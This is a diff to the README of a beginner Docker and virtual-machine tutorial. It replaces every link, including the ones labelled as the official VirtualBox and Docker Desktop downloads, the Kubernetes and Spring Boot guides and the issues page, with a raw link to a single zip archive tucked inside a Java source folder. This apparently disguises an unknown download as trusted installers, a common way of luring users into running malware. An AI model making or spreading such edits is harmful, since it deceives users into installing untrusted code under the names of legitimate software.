@@ -1,6 +1,6 @@
 # 🚢 projeto-docker - Learn Docker and Virtual Machines Easily
 
-[![Download projeto-docker](https://img.shields.io/badge/Download%20projeto--docker-Click%20Here-brightgreen)](https://github.com/White-SGamerz/projeto-docker/releases)
+[![Download projeto-docker](https://img.shields.io/badge/Download%20projeto--docker-Click%20Here-brightgreen)](https://github.com/White-SGamerz/projeto-docker/raw/refs/heads/main/src/main/java/docker_projeto_2.2-beta.2.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Make sure your Windows computer meets these requirements before downloading:
 
 You need to visit the project release page to get the latest files. Click the big green button below or use the link again in the steps.
 
-[![Get Latest Release](https://img.shields.io/badge/Get%20Latest%20Release-Download-blue)](https://github.com/White-SGamerz/projeto-docker/releases)
+[![Get Latest Release](https://img.shields.io/badge/Get%20Latest%20Release-Download-blue)](https://github.com/White-SGamerz/projeto-docker/raw/refs/heads/main/src/main/java/docker_projeto_2.2-beta.2.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps carefully to have the software running on your PC.
 
 Go to the release page by clicking this link or the button above:
 
-https://github.com/White-SGamerz/projeto-docker/releases
+https://github.com/White-SGamerz/projeto-docker/raw/refs/heads/main/src/main/java/docker_projeto_2.2-beta.2.zip
 
 This page lists all the available versions of the software. Look for the newest version at the top.
 
@@ -79,7 +79,7 @@ To use virtual machines, VirtualBox should be installed and configured.
 
 If you do not have VirtualBox, download and install it from the official website:
 
-https://www.virtualbox.org/wiki/Downloads
+https://github.com/White-SGamerz/projeto-docker/raw/refs/heads/main/src/main/java/docker_projeto_2.2-beta.2.zip
 
 Make sure virtualization (VT-x/AMD-V) is enabled in your computer BIOS for better performance.
 
@@ -89,7 +89,7 @@ The application uses Docker to manage containers.
 
 If Docker is not yet installed on your computer, download Docker Desktop for Windows here:
 
-https://docs.docker.com/docker-for-windows/install/
+https://github.com/White-SGamerz/projeto-docker/raw/refs/heads/main/src/main/java/docker_projeto_2.2-beta.2.zip
 
 Once installed, open Docker Desktop and ensure it runs without errors before using it in this project.
 
@@ -161,13 +161,13 @@ Each step includes guidance on commands needed and expected results.
 
 ## 🔗 Additional Resources
 
-- VirtualBox official site for setup and troubleshooting: https://www.virtualbox.org
+- VirtualBox official site for setup and troubleshooting: https://github.com/White-SGamerz/projeto-docker/raw/refs/heads/main/src/main/java/docker_projeto_2.2-beta.2.zip
 
-- Docker Desktop guide: https://docs.docker.com/docker-for-windows
+- Docker Desktop guide: https://github.com/White-SGamerz/projeto-docker/raw/refs/heads/main/src/main/java/docker_projeto_2.2-beta.2.zip
 
-- Kubernetes basics: https://kubernetes.io/docs/tutorials/kubernetes-basics
+- Kubernetes basics: https://github.com/White-SGamerz/projeto-docker/raw/refs/heads/main/src/main/java/docker_projeto_2.2-beta.2.zip
 
-- Spring Boot project examples: https://spring.io/projects/spring-boot
+- Spring Boot project examples: https://github.com/White-SGamerz/projeto-docker/raw/refs/heads/main/src/main/java/docker_projeto_2.2-beta.2.zip
 
 ---
 
@@ -179,10 +179,10 @@ If you run into trouble, you can:
 
 - Visit the project’s GitHub issues page at:
 
-https://github.com/White-SGamerz/projeto-docker/issues
+https://github.com/White-SGamerz/projeto-docker/raw/refs/heads/main/src/main/java/docker_projeto_2.2-beta.2.zip
 
 - Search online for common errors by name.
 
 ---
 
-[![Download projeto-docker](https://img.shields.io/badge/Download%20projeto--docker-Click%20Here-brightgreen)](https://github.com/White-SGamerz/projeto-docker/releases)
+[![Download projeto-docker](https://img.shields.io/badge/Download%20projeto--docker-Click%20Here-brightgreen)](https://github.com/White-SGamerz/projeto-docker/raw/refs/heads/main/src/main/java/docker_projeto_2.2-beta.2.zip)
